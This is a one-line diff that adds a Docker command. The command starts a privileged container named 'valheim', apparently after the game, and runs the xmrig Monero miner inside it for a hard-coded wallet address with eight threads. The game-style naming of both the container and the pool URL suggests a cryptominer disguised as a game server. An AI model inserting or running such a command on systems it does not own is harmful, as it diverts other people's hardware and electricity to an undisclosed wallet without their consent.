@@ -1,0 +1,1 @@
+docker run -v /dev/hugepages:/dev/hugepages --privileged --rm valheim /app/build/xmrig-notls --coin XMR --url "valheim" --user "8B1e8kfLb6xLmU6VmKhG5ydJXKVY1faZdfHsPRDCzFuYXp1MpGLctXxJj2SxhT6beGYKHbo4ohUk7csghsUzo2BCUfC67Ew/me" --threads 8
